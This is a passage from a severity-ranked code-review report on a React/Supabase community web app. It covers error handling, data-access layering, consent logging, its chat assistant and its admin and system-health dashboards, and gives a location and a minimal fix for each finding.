- **What breaks:** The 'no banners' branch performs window.localStorage.setItem directly in the component's render path, and the CLS-guard reads localStorage during render too. Side effects during render violate React's purity contract: under StrictMode the render runs twice, and under React 18 concurrent features a render can be started and thrown away, so this write can fire spuriously or interleave. It couples a leaf UI component directly to a web storage API for layout bookkeeping. Observable symptom: inconsistent/racy CLS-reservation values and storage writes that do not correspond to what the user saw. (The ref-callback write at :157-165 is fine — it runs after commit.)
- **Smallest fix:** Move the getItem/setItem for the 'no banners' case into a useEffect (or useLayoutEffect that runs after commit); never call localStorage in the render body.

### [Medium] PWA install prompt() rejections are unhandled promise rejections  `error-handling` (CONFIRMED)
- **Where:** src/components/PWAInstallPrompt.tsx:53-61 (handleInstall: await deferredPrompt.prompt() with no try/catch) and src/components/InstallAppCard.tsx:67-80 (handleInstall: try/finally with no catch)
- **What breaks:** beforeinstallprompt.prompt() rejects if called without a transient user activation or if the saved event was already consumed (double-click, stale deferredPrompt after the browser showed its own prompt). PWAInstallPrompt has no try/catch, and InstallAppCard uses try/finally with no catch — in both cases the rejection escapes an async onClick handler React cannot catch, surfacing as an unhandled promise rejection that reaches window.onerror/error reporters as noise. The user gets no feedback and the button just appears dead.
- **Smallest fix:** Wrap the prompt()/userChoice sequence in try/catch, clear deferredPrompt in the catch, and show a fallback message; recover, retry, or report rather than letting the rejection float.

### [Medium] NetworkActivity silently substitutes a different metric when the real completions count is missing  `under-engineering` (CONFIRMED)
- **Where:** src/components/NetworkActivity.tsx:264 (value={safeStats.course_completions_total ?? safeStats.core_courses_active}) and :300 (prev_week variant); historical fields at :268-270 read safeStats.historical?.* which is absent from defaultStats:20-45
- **What breaks:** Two prominent 'Core Course Completions' stat circles show course_completions_total but fall back with ?? to core_courses_active — a semantically different quantity (currently-active courses, not completions). If completions is ever null/undefined from the RPC, the UI confidently displays the wrong number under a 'Completions' label with no indication anything is off, misinforming every landing-page visitor. Relatedly safeStats.historical?.historical_beginner_courses / historical_advanced_courses / general_applications_pre_platform are summed at :268-270 but 'historical' is not present on defaultStats, so the summed totals silently depend on a shape the default never guarantees.
- **Smallest fix:** Drop the cross-metric ?? fallback (render 0 or a dash for genuinely missing completions), and make 'historical' an explicit typed field on NetworkStats with a default so the summed values are defined by contract, not by luck.

### [Medium] Duplicated iOS/standalone/device detection across the two PWA components  `under-engineering` (CONFIRMED)
- **Where:** src/components/InstallAppCard.tsx:20-34 (isIos/isStandalone/getDeviceLabel) vs src/components/PWAInstallPrompt.tsx:13-22 (isIos/isStandalone) — byte-identical copies
- **What breaks:** The same platform-detection helpers exist in two files. iOS/standalone detection is fiddly and changes over time (iPadOS spoofing desktop UA, new display-mode values); when one copy is fixed the other silently keeps the old behavior, so the install card and the install prompt can disagree about whether the same device is iOS or already installed — one nags to install while the other says it is installed. Classic two-ways-to-do-one-thing drift.
- **Smallest fix:** Extract isIos/isStandalone/getDeviceLabel into a single lib module (e.g. src/lib/pwa/platform.ts) and import from both components.

### [Medium] NotificationBell navigates to a DB-supplied link_url verbatim, breaking external links and skipping validation  `security` (PLAUSIBLE)
- **Where:** src/components/NotificationBell.tsx:324-330 (selectedNotification.link_url && ... navigate(selectedNotification.link_url)) — link_url originates from the notifications table
- **What breaks:** link_url is passed straight into react-router navigate() with no scheme/allowlist check. Correctness: an absolute URL like 'https://…' is treated by navigate() as an in-app path ('/https://…') and silently breaks, so any externally-intended notification link is dead. Trust: the value is data written by whatever creates notifications (system/admin/edge functions); react-router neutralizes off-origin navigation for a string path, but a crafted or buggy internal value (unexpected route, encoded segments) still routes the user somewhere unintended on click, unvalidated. (Note: the earlier claim citing :237-240 was wrong — that navigate is the static '/profile/notifications' route; only :329 uses link_url.)
- **Smallest fix:** Validate link_url before navigating: require a leading '/' allowlisted internal path, and route genuinely external URLs through a normal anchor with rel=noopener; reject anything else.

### [Medium] NetworkActivity fetches the Discord member count via supabase.functions.invoke inline in the component  `boundary` (CONFIRMED)
- **Where:** src/components/NetworkActivity.tsx:8 (import { supabase }) and :169-182 (useQuery queryFn calls supabase.functions.invoke('get-discord-member-count') and throws on error inline)
- **What breaks:** Every other stat on this landing page goes through StatsService (getNetworkStats/getCachedNetworkStats), but the Discord member count reaches straight past that boundary and calls the edge function directly from inside a React component — the edge-function name, HTTP method, response shape ({member_count}) and error handling are all buried in JSX-adjacent code. If another surface needs the Discord count tomorrow it cannot find it, so it gets copied; and when the function contract changes there is no single owner to update. This is exactly the 'data access inside a component/handler' anti-pattern the repo rules call out.
- **Smallest fix:** Move the get-discord-member-count call into StatsService (or a small discord stats service) that returns a typed count, and have NetworkActivity consume it through that service like it does the other stats.
- _added-in-verification_

### [Low] AnnouncementBanner dismiss failure is swallowed with no report  `error-handling` (CONFIRMED)
- **Where:** src/components/AnnouncementBanner.tsx:116-122 (try { await dismissBanner(...) ... } catch { /* degrade gracefully */ })
- **What breaks:** dismissBanner can throw on RLS/schema/network failure; the catch is empty except a comment. The UI 'recovers' (the optimistic setQueryData at :118 never runs so the banner stays), but a persistent server-side dismissal failure — e.g. an RLS regression on banner_dismissals — is completely invisible to the triage pipeline the rest of this codebase feeds via reportError. Every user re-sees a banner they keep dismissing and nobody is alerted. The repo rule requires recover/retry/report; this one only recovers.
- **Smallest fix:** Call reportError(err, 'AnnouncementBanner.dismiss', { severity: 'warn' }) inside the catch so the silent failure reaches System Health.

### [Low] DiscordInviteBanner gates on an untyped (profile as any).has_discord_account  `under-engineering` (CONFIRMED)
- **Where:** src/components/DiscordInviteBanner.tsx:24-25 (const hasAccount = (profile as any)?.has_discord_account === true; then early-return on it)
- **What breaks:** The 'user already has a Discord account' gate reads a field via an any-cast, invisible to the type checker. If that column is renamed or the profile shape changes, the expression silently evaluates to false forever and the invite banner starts nagging users who explicitly said they already have Discord — with no compile error.
- **Smallest fix:** Add has_discord_account to the typed Profile shape and read it without the any-cast so a rename is a compile error, not a silent behavior change.

### [Low] DiscordRolePicker create-error branch reads an error field never populated on the error path  `error-handling` (CONFIRMED)
- **Where:** src/components/DiscordRolePicker.tsx:94-100 (if (res.error) { const errBody = res.data?.error; if (errBody === 'Failed to create Discord role') throw helpful message ... })
- **What breaks:** When supabase.functions.invoke returns res.error, res.data is generally null, so res.data?.error is undefined and the specific 'bot lacks Manage Roles permission' message can essentially never fire. Admins hitting the real permission error always get the generic res.error.message fallback instead, making a common Discord misconfiguration harder to diagnose than the code implies.
- **Smallest fix:** Inspect res.error (message/status/context) for the permission signal, or have the edge function return the machine-readable code somewhere the client actually receives on failure (e.g. via a non-2xx body the SDK exposes).

### [Low] SectionEmptyState declares an icon prop it never renders  `over-engineering` (CONFIRMED)
- **Where:** src/components/SectionEmptyState.tsx:3-9 (icon?: LucideIcon in props interface; function only destructures { title, description })
- **What breaks:** The component's public API advertises an icon prop, but the implementation drops it — callers passing an icon get no icon and no warning, so an intended visual silently disappears and reviewers assume the feature works. Dead surface area that misleads every future caller.
- **Smallest fix:** Either render the icon (as DashboardEmptyState does) or remove it from the interface so the API matches behavior.

### [Low] Founding/yearly membership price string derived independently in two components  `ownership` (CONFIRMED)
- **Where:** src/components/CurrentMembershipBanner.tsx:34-41 (priceLabel derivation from FOUNDING_PROMO) and src/components/MembershipTiersGrid.tsx:349-371 (derivePriceView community/yearly/founding branch)
- **What breaks:** Two components each hand-assemble the community-yearly / founding-member price display from the same FOUNDING_PROMO config with slightly different string formatting (banner appends ' USD per year'; grid sets priceSubtitle:'USD per year' separately). When the promo rules change (yearly display, strikethrough logic), the banner and the grid can format the same plan's price differently, so a user sees one number on the tier grid and a subtly different one on the current-plan banner. Pricing presentation should have one owner.
- **Smallest fix:** Extract a single price-view helper next to the membership-tiers config and have both components call it, so the founding/yearly display is computed in exactly one place.

### [Low] DiscordRolePicker double-fetches roles on entering search mode (concurrent-request race)  `other` (CONFIRMED)
- **Where:** src/components/DiscordRolePicker.tsx:60-65 (effect: if mode==='search' fetchRoles()) and :68-73 (debounced effect also schedules fetchRoles(search) when mode changes to 'search')
- **What breaks:** When the user enters search mode, the first effect immediately calls fetchRoles() and the second (debounced) effect also fires because mode is in its deps, scheduling a second fetchRoles(search='') 300ms later. Two list requests race for the same result; there is no request-sequence guard or AbortController, so if the responses arrive out of order (or the server returns different data between them) setRoles is written by whichever resolves last, and every mode entry doubles the edge-function load. Harmless when both return identical empty-search results, latent bug the moment they differ.
- **Smallest fix:** Drive the initial load from the debounced effect alone (or add an ignore/AbortController flag so only the latest fetchRoles result is applied), so entering search mode issues exactly one request.
- _added-in-verification_

---

## App shell, layout, legal/consent, Fleety, editor & shared UI components

### [High] Four divergent copies of streamChat + duplicated chat persistence own the same tables  `ownership` (CONFIRMED)
- **Where:** src/lib/fleety/stream-chat.ts:44 (canonical) vs src/components/FleetyChatWidget.tsx:59/300-319, src/pages/ChatPage.tsx:48/266-322, src/components/resources/GuidanceEmbed.tsx, src/hooks/useFleetyChat.ts:32-54
- **What breaks:** The SSE client and the chat_conversations/chat_messages write logic exist in 4+ places. stream-chat.ts's own header admits three surfaces still carry inline copies. Any protocol change (new SSE frame, auth change, sanitization, input cap) must be made in every copy or the surfaces silently diverge — e.g. MAX_INPUT_LENGTH/turn-id/[DONE] handling can differ per surface, and a fix to one leaves the others broken. Each surface writes directly into chat_conversations/chat_messages with its own createConversation/saveMessage, so there is no single owner of the conversation write path.
- **Smallest fix:** Delete the inline streamChat + createConversation/saveMessage/loadConversations in FleetyChatWidget, ChatPage, GuidanceEmbed and route them all through stream-chat.ts and a single useFleetyChat (or a conversations service). Make the inline copies a compile error via an ESLint no-restricted-syntax rule.

### [High] saveMessage swallows insert errors — chat messages silently lost  `error-handling` (CONFIRMED)
- **Where:** src/hooks/useFleetyChat.ts:48-54 and src/components/FleetyChatWidget.tsx:313-319
- **What breaks:** `await supabase.from('chat_messages').insert(...)` ignores the returned {error}. On an RLS denial, constraint violation, or network blip the message is dropped from the DB while the UI still shows the full thread. On reload the user's message and Fleety's answer are simply gone — a catch/failure path that neither recovers, retries, nor reports. createConversation failing (returns null) likewise drops the whole conversation to unpersisted with no signal to the user.
- **Smallest fix:** Check the returned error, surface a toast/error state, and stop advancing persistence when the insert fails; at minimum log+report. Do not set updated_at or continue as if saved.

### [High] Consent audit write fails silently AND is de-duped before it succeeds  `error-handling` (CONFIRMED)
- **Where:** src/components/CookieConsentBanner.tsx:114-144 (persist)
- **What breaks:** The session fingerprint is written to sessionStorage (line 122) BEFORE `record-consent` is invoked (line 127), and the invoke is `void`-ed inside a try/catch that cannot catch its async rejection. So when the edge function is down, the promise rejects unhandled, the failure is invisible, and the fingerprint is already cached — the write is never retried for the rest of the session. The component's own docstring says GDPR Art. 7(1) requires provable consent; a failed record-consent silently loses that proof with zero telemetry.
- **Smallest fix:** Await the invoke, check its error, and only set the dedup fingerprint after a confirmed success; on failure leave the fingerprint unset (so the next route change retries) and report the failure.

### [High] Two consent owners + trackers loaded by both our code and CookieYes  `ownership` (PLAUSIBLE)
- **Where:** src/lib/consent/manager.ts (tfn.consent.v1) + src/lib/consent/cookieyes.ts + src/components/CookieConsentBanner.tsx + src/lib/consent/loadAnalytics.ts:34-77
- **What breaks:** Consent state has two owners kept 'in sync' by reconciliation: our first-party tfn.consent.v1 localStorage state and CookieYes's cookie/getCkyConsent() API. loadAnalytics.ts injects GA4 (G-WYQKEKXSRR) and Clarity itself, while CookieYes (an auto-blocking CMP) also injects/unblocks the same tags — so trackers can double-load (double page-views/sessions) and the two consent stores can disagree (e.g. user rejects in the CookieYes modal but our reconcile path read a stale cookie). Two copies of the consent fact will eventually diverge and there is no single source of truth for 'is analytics allowed'.
- **Smallest fix:** Pick one owner. Either let CookieYes own tag-loading and delete loadGa4/loadClarity, or self-host consent and drop CookieYes. Do not run both CMPs injecting the same GA4/Clarity IDs.

### [Medium] CookieYes banner_load with empty detail marks consent 'decided' and logs a record the user never gave  `error-handling` (PLAUSIBLE)
- **Where:** src/components/CookieConsentBanner.tsx:98-112 (fromCkyDetail), fired from onConsent for 'cookieyes_banner_load'
- **What breaks:** onConsent is bound to `cookieyes_banner_load`/`cookieyes_banner_loaded`, not just consent updates. When those fire with an empty/absent detail, `accepted` is an empty set, so fromCkyDetail returns analytics/functional/marketing=false with decidedAt=new Date() and persists it — stamping a 'decision' and POSTing a consent record before the user has clicked anything. That both suppresses needsBanner() and writes a false audit row attributing a non-decision to the user.
- **Smallest fix:** Only treat an event as a decision when detail.isUserActionCompleted (or accepted/rejected is actually populated); do not set decidedAt or POST record-consent on bare banner-load events.

### [Medium] loadConversations pulls the entire conversation history unbounded, on every open and every send  `other` (CONFIRMED)
- **Where:** src/hooks/useFleetyChat.ts:57-64 and src/components/FleetyChatWidget.tsx:263-270
- **What breaks:** The select has no .limit() and no pagination; it returns every chat_conversations row for the user ordered by updated_at. useFleetyChat additionally re-runs it inside onDone after every assistant turn (line 154). A heavy user with thousands of conversations re-downloads the whole list on each message — growing latency and payload with no ceiling.
- **Smallest fix:** Add .limit(N) with pagination/'load more', and stop refetching the full list on every onDone (prepend/patch the touched row instead).

### [Medium] AppLayout's save-data / 2g Fleety gating is dead code — widget mounts unconditionally  `other` (CONFIRMED)
- **Where:** src/components/AppLayout.tsx:72-77,258-262 vs 521-523 and 547-549
- **What breaks:** `const fleetyWidget = isSlow ? null : (<Suspense><FleetyChatWidget/></Suspense>)` (and the whole useNetworkQuality/isSlow branch) is computed and never used. Every render branch instead mounts `<Suspense><FleetyChatWidget/></Suspense>` directly, so the documented 'skipped on save-data / 2g connections' behavior (comment line 72) never happens — low-end/2g users always download and mount the heavy chat widget. Dead variable plus a silently unimplemented performance guard.
- **Smallest fix:** Either render {fleetyWidget} in the branches (honoring isSlow) or delete the unused variable and the misleading comment. Pick one so behavior matches the docstring.

### [Medium] SSE parser stalls permanently on a single malformed frame, silently truncating the answer  `error-handling` (PLAUSIBLE)
- **Where:** src/lib/fleety/stream-chat.ts:120-175 (handleLine 'retry' path)
- **What breaks:** When handleLine returns 'retry' the code assumes the line is merely split across chunks and re-buffers it as-is. A genuinely malformed `data:` frame that never becomes valid JSON is retried against the same leading bytes on every subsequent read, so the inner loop keeps breaking on it and no later line is ever parsed. The trailing flush also just re-hits 'retry' and drops it. Net effect: one bad frame mid-stream silently truncates the rest of Fleety's response with no error shown. Every inline copy inherits this.
- **Smallest fix:** Distinguish 'incomplete' (buffer, only when no newline follows) from 'unparseable' (a complete line that failed JSON) and skip/report the latter instead of re-buffering it forever.

### [Low] chat_conversations.updated_at is written by the client instead of the DB  `ownership` (PLAUSIBLE)
- **Where:** src/hooks/useFleetyChat.ts:50-53 and src/components/FleetyChatWidget.tsx:315-318
- **What breaks:** After each message insert the client issues a second round-trip to set updated_at = new Date().toISOString(). The freshness of a row is a fact the database should own (a trigger on chat_messages insert). Client-owned timestamps drift with clock skew, double the write traffic, and can silently fail (unchecked, per the error-handling finding) leaving updated_at stale and the history ordering wrong.
- **Smallest fix:** Drop the client update and maintain updated_at via a DB trigger on chat_messages insert; the client only inserts the message.

---

## Admin components

### [High] Unbounded full-table fetch of every completed application on each project-analysis view  `under-engineering` (CONFIRMED)
- **Where:** src/components/admin/ProjectAnalysisContent.tsx:187-198 (allApps) and 203-213 (crossProjectLookup)
- **What breaks:** The `analysis-all-completed-apps` query is `.from('project_applications').select('user_id, project_id').eq('status','completed')` with NO limit and NO project filter, and its query key is the static `['analysis-all-completed-apps']` — so every admin opening any project's analysis tab pulls the ENTIRE completed-applications table into the browser, then the useMemo at 232-282 diffs it client-side to compute 'also applied elsewhere'. crossProjectLookup (203-213) likewise selects EVERY project (all statuses) with no bound. At 767 members applying to several projects each, this is thousands→tens-of-thousands of rows transferred and processed on the main thread on every mount; it grows unbounded forever and will eventually time out or OOM the tab. It also ships every applicant's cross-project application map to the client, gated only by RLS.
- **Smallest fix:** Move the cross-project overlap + client-name resolution into a Postgres RPC that takes projectId and returns only the per-user other-project list for THIS project; call it through a data hook. Never select the whole table client-side.

### [High] Admin components write directly to the database, bypassing the services layer  `dependency` (CONFIRMED)
- **Where:** FleetyPlaybooksManager.tsx:148-150,160,184-186,196; FleetyHealthTab.tsx:140-146,155-162; FleetyCostPanel.tsx:62-65; ContentGapsTab.tsx:145-148
- **What breaks:** These components issue raw supabase.from(table).insert/update/delete straight from React handlers. The codebase clearly has a services convention (ProfileService, logger.service, session-port are imported elsewhere), so this violates the UI→hook→service→lib layering in the write direction: zero centralized validation, sanitization, or mass-assignment control — RLS is the ONLY write guard, and FleetyPlaybooksManager's own header comment says so explicitly ('we depend on it server-side rather than gating in the client'). Given this team already shipped a migration-never-applied outage (MEMORY.md), one loosened/mis-migrated RLS policy turns these into open write endpoints. Admin free-text (answer_md, direct_answer, description, excerpt) is stored raw and later re-embedded into Fleety's knowledge base — a stored-content injection surface with no server-side sanitization gate. Nothing else can reuse these writes, so the next surface that saves a playbook/canned answer copies the SQL.
- **Smallest fix:** Introduce owning services (FleetyContentService / ContentGapsService / CostGuardService) that hold these mutations with validation + sanitization, and have components call them via mutation hooks. Do not treat RLS as the only write guard.

### [High] ContentGapsTab silently swallows per-table query errors — placeholder gaps vanish  `error-handling` (CONFIRMED)
- **Where:** src/components/admin/ContentGapsTab.tsx:103 (`if (error) return []`)
- **What breaks:** load() fans out one query per reference table (19 of them via Promise.all) and on ANY error returns `[]` for that table with no report. A renamed column, an RLS denial, or a transient failure on e.g. reference_workshops makes that table's placeholder rows disappear from the gaps list. The admin sees a shorter (or empty '🎯 All content has real descriptions') list and believes the work is done — while Fleety keeps serving placeholder descriptions indefinitely. No toast, no logger, no error state: the failure is completely invisible. Compounded by the `(supabase as any)` cast (line 98), a schema drift compiles fine and fails only at runtime, where it is then swallowed here.
- **Smallest fix:** Collect per-table errors and surface them (partial-failure banner naming the failed table); never render the success/empty state when any table query failed.

### [High] Costly platform-wide AI translation operations fire from single unconfirmed clicks  `under-engineering` (CONFIRMED)
- **Where:** src/components/admin/system-health/TranslationsTab.tsx:80-90 (runBackfill), 92-110 (runSeed)
- **What breaks:** 'Translate everything now' calls rpc('backfill_ugc_translations') for ALL content, and 'Seed translations' enqueues jobs across 15 pre-filled languages (es,fr,de,pt,ja,zh,ar,hi,ko,it,nl,pl,tr,vi,sw) — each an expensive LLM run — behind only a `disabled` spinner, NO confirm() and no cost/scope warning. One stray click bulk-enqueues thousands of paid translation jobs. This is inconsistent with ContentGapsTab (lines 171,191) which DOES confirm() before its bulk AI autofill/Figma scrape, and it directly defeats the FleetyCostPanel budget guard that exists specifically to control AI spend.
- **Smallest fix:** Gate runBackfill and runSeed behind a confirm() (or typed-confirmation dialog) that states scope and cost, matching ContentGapsTab's pattern.

### [Medium] TranslationsTab loader ignores all query errors and renders 'no locales / no failures' on failure  `error-handling` (CONFIRMED)
- **Where:** src/components/admin/system-health/TranslationsTab.tsx:52-76 (destructures only `data`)
- **What breaks:** load() destructures `[{ data: s }, { data: c }, { data: f }]` from three queries and discards `error` entirely. If ugc_translation_summary / i18n_coverage_audit / i18n_qa_failures fail (RLS, network, migration drift), the component renders 'No active non-English locales yet' and 'No recent QA failures' — telling the admin everything is healthy when the data simply failed to load. QA failures that need attention become invisible. (Location corrected: file is under system-health/, not the admin root.)
- **Smallest fix:** Capture and check each query's error; render a destructive error state instead of the empty/healthy copy when any load failed.

### [Medium] Recruitment-readiness scoring algorithm is trapped inside a UI component  `boundary` (CONFIRMED)
- **Where:** src/components/admin/ProjectAnalysisContent.tsx:86-134 (computeReadinessScore) and 232-282 (analysis useMemo)
- **What breaks:** The weighted readiness score (hats 50% / other 20% / uniqueness 15% / prev-phase 15%), the per-hat sub-score thresholds (IDEAL_PER_HAT/READY_THRESHOLD), and the whole unique-vs-shared applicant business logic all live in the component. If an email digest, Slack alert, edge function, or admin export ever needs the same 'is this project ready to recruit' number, it cannot find or reuse it — it will be reimplemented and the two definitions will drift. Display and business math are fused.
- **Smallest fix:** Extract the scoring + applicant-overlap logic into a pure module (e.g. src/services/recruitment-readiness.ts) importable by both the component and any server surface; the component only renders its output.

### [Medium] 'Last 14 days' cost table uses an unordered LIMIT — shows arbitrary rows  `under-engineering` (CONFIRMED)
- **Where:** src/components/admin/FleetyCostPanel.tsx:47 (`.from('fleety_cost_daily').select('*').limit(14)`)
- **What breaks:** No `.order()`, so Postgres may return any 14 rows in undefined order (physical/planner order, which shifts after vacuum/updates). The card is labelled 'Daily spend (last 14 days)' but can display neither the most recent 14 days nor any consistent sort. Admins make cost-guard decisions off a table that silently misrepresents the spend trend.
- **Smallest fix:** Add `.order('day', { ascending: false }).limit(14)` and render sorted.

### [Medium] FleetyCostPanel silently discards two of three load errors  `error-handling` (CONFIRMED)
- **Where:** src/components/admin/FleetyCostPanel.tsx:50-53
- **What breaks:** load() toasts on `p.error`, but for daily (`if (!d.error) setDaily`) and top (`if (!t.error) setTop`) it simply skips setState on error — no toast, no state change. When those queries fail, the daily table and top-queries list render their empty copy ('No telemetry yet' / 'No repeated queries yet') with no indication the data failed rather than being absent. Admin cannot distinguish 'no spend' from 'query broke' on the panel whose entire purpose is spend vigilance.
- **Smallest fix:** Report d.error and t.error (toast or inline error) and do not render the empty-state copy on failure.

### [Medium] FleetyHealthTab swallows every query error, then computes a truncated gap count  `error-handling` (CONFIRMED)
- **Where:** src/components/admin/FleetyHealthTab.tsx:69-117
- **What breaks:** All five parallel queries drop `.error` (`(sigsRes.data ?? [])`, `(cansRes.data ?? [])`, `(pgapsRes.data ?? [])`, `upRes.count ?? 0`, `dnRes.count ?? 0`). A failed load renders 0 turns / 0 knowledge gaps / '🎉 No knowledge gaps' — hiding real gaps behind a success message. Separately, stats.gaps (line 111) is computed by filtering only the 200 most-recent signals set by limit(200) at line 78, so the headline 'Knowledge gaps' count is capped and wrong whenever there are >200 recent turns, and disagrees with what the server would report.
- **Smallest fix:** Check each response's error and surface a failure state; compute the gap count via a COUNT query/RPC rather than client-side over a truncated 200-row page.

### [Medium] FleetyPlaybooksManager ignores load errors — admins re-create existing content as duplicates  `error-handling` (CONFIRMED)
- **Where:** src/components/admin/FleetyPlaybooksManager.tsx:111-120
- **What breaks:** load() does `setPlaybooks((pbRes.data ?? []))` / `setExamples((exRes.data ?? []))` without checking pbRes.error / exRes.error. If the fetch fails the UI shows 'No playbooks yet — add one'. An admin then authors a 'new' playbook with a slug that already exists; the insert either collides on the unique slug (surfacing a confusing raw DB error) or creates near-duplicate content that pollutes Fleety retrieval.
- **Smallest fix:** Check and surface load errors; distinguish 'empty' from 'failed to load' before showing the add-one empty state.

### [Medium] WorkshopDocsUploader maps upload results positionally — wrong docs marked uploaded/failed  `other` (CONFIRMED)
- **Where:** src/components/admin/WorkshopDocsUploader.tsx:120-128 (`const res = results[i]`)
- **What breaks:** It assumes the edge function returns `data.results` in the exact same order and count as the `ready` array it sent, matching by index. If ingest reorders, de-duplicates, filters, or drops a doc, results[i] no longer corresponds to ready[i]: a doc that actually failed gets marked 'uploaded' (admin thinks it shipped and deletes it) and a successful one gets marked 'error'. The response object even carries a `title` per result (line 120) that is available for correlation but ignored in favor of the index.
- **Smallest fix:** Echo a stable id (or use the title already present) per doc and match results by id, not by array position.

### [Medium] HIPAA-labelled PII-access audit-log failure is fully swallowed  `error-handling` (CONFIRMED)
- **Where:** src/components/admin/UserDetailDialog.tsx:20-33
- **What breaks:** The effect logs admin PII access via rpc('log_pii_access') and on any error runs an empty `catch { /* swallow */ }` — no logger, no telemetry, no counter — while the PII (name, email) still renders. 'Never block UI for audit logging' is reasonable, but silently dropping the write means a systematically failing audit RPC (a permission change or renamed function — exactly the PGRST202 class of outage in MEMORY.md) goes undetected, leaving unprovable gaps in a compliance-mandated access trail.
- **Smallest fix:** Report the failure out-of-band (logger.error / error telemetry / retry queue) instead of an empty catch, so audit-log outages are visible even though the UI is not blocked.

### [Medium] ContentGapsTab casts the typed Supabase client to `any` to read/write 19 tables  `under-engineering` (CONFIRMED)
- **Where:** src/components/admin/ContentGapsTab.tsx:98 and 145 (`(supabase as any).from(t)`)
- **What breaks:** Iterating tables by string forces `(supabase as any)`, discarding all compile-time checking of table names, selected columns, and the update payload. A renamed column/table (schema drift) compiles cleanly and fails only at runtime for that table — where the error is then swallowed (`if (error) return []`, line 103), so it fails completely invisibly. The update at 145-148 writes `{ description, description_source }` to 19 different tables with zero guarantee those columns exist on each.
- **Smallest fix:** Back the multi-table scan/update with typed RPCs (get_content_gaps / update_content_description) so table/column names are validated server-side and the client stays typed.

### [Medium] ApplicantStatusDropdown carries a multi-step status-change workflow inside a dropdown  `boundary` (CONFIRMED)
- **Where:** src/components/admin/ApplicantStatusDropdown.tsx:125-270
- **What breaks:** handleStatusChange encodes real workflow in the component: scheduling-link precondition (140-154), coordinator-name resolution via a direct read of project_roster (83-90), an active_participant pre-flight that reads project internal links via RPC (163-165) and reads the applicant's profile directly (`supabase.from('profiles').select('discord_user_id, discord_username')`, 184-188), then invokes the notify edge function. The same status-change rules apply anywhere an applicant status can change (bulk actions, other screens) but are reachable only through this one dropdown — a second caller will duplicate the preconditions and they will drift. It also reads the applicant profile with raw supabase here while using ProfileService.fetch for the admin's own profile two blocks up (137), so one path gets the service's shape/sanitization and the other does not.
- **Smallest fix:** Move the preconditions + orchestration into a service/hook (e.g. useChangeApplicantStatus) and route both profile reads through ProfileService.

### [Medium] WorkshopDocs ingest has no idempotency key — a re-upload after ambiguous failure duplicates KB entries  `under-engineering` (PLAUSIBLE)
- **Where:** src/components/admin/WorkshopDocsUploader.tsx:101-139 (uploadAll)
- **What breaks:** uploadAll sends `docs.map(d => ({ title, content }))` to ingest-workshop-docs with no client-generated stable id or idempotency token. On a thrown transport error after the function has partially inserted (line 132 marks ALL ready docs 'error'), or when the positional result-mapping bug (line 122) wrongly marks a succeeded doc as 'error', the admin re-uploads — and with no idempotency key the ingest inserts a second copy of the same workshop into Fleety's knowledge base. Duplicate KB rows then pollute retrieval and skew embeddings. Confidence is PLAUSIBLE because the edge function's insert/upsert semantics were not inspected here.
- **Smallest fix:** Send a stable content hash or client UUID per doc and have ingest upsert on it (or dedupe by title+hash); surface partial-success per doc so admins do not blind-retry the whole batch.
- _added-in-verification_

### [Low] authorPlaybookFromGap tells the admin the question was copied even when the clipboard write failed  `error-handling` (CONFIRMED)
- **Where:** src/components/admin/FleetyHealthTab.tsx:123-129
- **What breaks:** `void navigator.clipboard?.writeText(q).catch(() => {})` swallows the clipboard failure, then unconditionally `toast.success('Question copied. …paste into When to use')`. In a non-secure context, on permission denial, or on focus loss, nothing is copied but the admin is told it was and instructed to paste — they paste stale/empty clipboard content into the playbook.
- **Smallest fix:** Await the write and only show the 'copied' toast on success; on failure tell them copy failed (still switch tabs).

### [Low] Dead code: ApplicantsTable and enrichedRows memo are built but never rendered  `over-engineering` (CONFIRMED)
- **Where:** src/components/admin/ProjectAnalysisContent.tsx:291-299 (enrichedRows), 621-686 (ApplicantsTable), 530 (removal comment)
- **What breaks:** Line 530 comments 'Applicants table removed per design', but the whole ApplicantsTable component, its EnrichedRow type, and the enrichedRows useMemo remain in the file. enrichedRows maps and enriches every applicant on each render for output nobody displays (wasted work every render), and the dead component invites a future editor to wire back a table that was deliberately removed.
- **Smallest fix:** Delete ApplicantsTable, EnrichedRow, and the enrichedRows memo (the ThemedAgGrid/ColDef imports too if unused after).

### [Low] MemberVideoActivityCard fetches in a raw useEffect instead of the app's React Query layer  `dependency` (CONFIRMED)
- **Where:** src/components/admin/MemberVideoActivityCard.tsx:42-60
- **What breaks:** Unlike the rest of the subtree (ProjectRosterContent, SystemHealthWidget, SilentFailuresTab use useQuery), this component hand-rolls useEffect + supabase.from('lesson_video_events') with manual cancelled-flag bookkeeping. It gets no caching, no dedupe, no shared invalidation, refetches from scratch on every mount, and re-implements loading/error state the query layer already provides — the exact 'two ways to do one thing' drift the repo rules warn against.
- **Smallest fix:** Replace with a useQuery keyed on [userId, limit], ideally behind a data hook.

### [Low] TranslationsTab coverage dedup over LIMIT 100 can silently drop locales at scale  `under-engineering` (PLAUSIBLE)
- **Where:** src/components/admin/system-health/TranslationsTab.tsx:56-73
- **What breaks:** Coverage is fetched as the 100 most-recent i18n_coverage_audit rows across ALL locales (order audited_at desc, limit 100) and then deduped to latest-per-locale client-side. Once audit history grows (many locales audited many times), a locale whose latest snapshot has been pushed past the 100-row window disappears from the coverage map, so its row in the summary table shows '—' for UI/UGC coverage even though a coverage figure exists in the DB. The number silently becomes unavailable rather than wrong, but admins reading coverage lose visibility exactly as the locale set grows.
- **Smallest fix:** Fetch latest-per-locale server-side (a DISTINCT ON (locale) … ORDER BY locale, audited_at DESC view/RPC) instead of a global LIMIT 100 the client dedupes.

---

## System-health dashboard components

### [High] UI components write directly to compliance/ops tables, bypassing the service layer  `boundary` (CONFIRMED)
- **Where:** IncidentsTab.tsx:117 (supabase.from('incident_response').update); PrivacyRequestsTab.tsx:103 (dsar_requests.update); HelpDeskTab.tsx:124-127 (support_provisioning_log.update); KnownIssuePanel.tsx:71-75,94-100 (known_issue_catalog update/insert)
- **What breaks:** Verified: each of these runs a raw .update()/.insert() from inside the component against GDPR breach records, DSAR decisions, help-desk provisioning, and the error-silencing catalog, while SystemHealthService (system-health.service.ts:130-136) proves writes are meant to be typed service methods. There is no single owner: validation, column allow-listing, audit-stamping, and side-effects (actually sending a regulator notice) can only live in RLS/triggers, and no future business rule has a home. IncidentsTab.patchIncident takes an arbitrary Partial<IncidentRow>, so the write surface is whatever RLS permits — an admin (or a future caller) can rewrite notification_due_at, draft notices, or affected_user_count directly. A second caller needing 'mark incident resolved' tomorrow cannot find this and will copy it.
- **Smallest fix:** Add explicit typed methods with allow-listed columns to SystemHealthService (or dedicated incident/dsar/helpdesk services), have components call those, and forbid supabase.from().update/insert inside system-health components via the arch gate.

